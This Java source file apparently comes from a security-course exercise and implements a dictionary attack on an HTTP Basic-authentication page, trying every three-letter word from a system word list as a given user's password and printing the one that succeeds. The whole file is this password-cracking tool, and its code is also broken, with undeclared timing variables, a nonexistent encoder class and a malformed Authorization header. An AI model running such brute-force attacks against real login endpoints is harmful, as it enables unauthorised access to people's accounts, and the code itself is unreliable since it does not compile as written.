

import java.net.*; 
import java.io.*; 
import java.util.Date; 
public class  Dictionary{
private static String password="   "; 

   
  public static void main(String[] args) {
   String Result="";   
	 if (args.length<1)
	 {
       System.out.println("Correct Format Filename  username e.g<>"); 
        System.exit(1);	
	 }
	 
	 Dictionary dicton1 = new Dictionary();
      Result=dicton1.Dict("http://sec-crack.cs.rmit.edu./SEC/2/",args[0]); 
	  System.out.println("Cracked Password for The User "+args[0]+" The Password is.."+Result); 
      

 
 
  }



 private String Dict(String urlString,String username) 
 { 
  int cnt=0;
  FileInputStream stream=null;
  DataInputStream word=null;

	try{ 
	 stream = new FileInputStream ("/usr/share/lib/dict/words"); 

	word =new DataInputStream(stream);
	 t0 = System.currentTimeMillis();  
		 while (word.available() !=0)   
			{
									
			password=word.readLine();
				 if (password.length()!=3)
				 {
					continue;
				 }
				 System.out.print("crackin...:"); 
			     System.out.print("\b\b\b\b\b\b\b\b\b\b\b" ); 
			  URL url = new URL (urlString);
				String userPassword=username+":"+password;  
				   
				   String encoding = new url.misc.BASE64Encoder().encode (userPassword.getBytes());
					 URLConnection conc = url.openConnection();
						   conc.setRequestProperty  ("Authorization", " " + encoding);			   
						   conc.connect();  
						   cnt++;
					   if (conc.getHeaderField(0).trim().equalsIgnoreCase("HTTP/1.1 200 OK"))
						 {
							System.out.println("The Number Of Attempts : "+cnt); 
							 t1 = System.currentTimeMillis();  
							 net=t1-t0;
							System.out.println("Total Time in secs..."+net/1000); 
							return password;  
						}
 		 		
	         }

				}

		      	catch (Exception e )
				{
				  e.printStackTrace();   

				}

    
try
{
word.close();
stream.close(); 
	
}
 
catch (IOException e)
{ 
System.out.println("Error in closing input file:\n" + e.toString()); 
} 

return "Password could not  found";  
 } 
 

}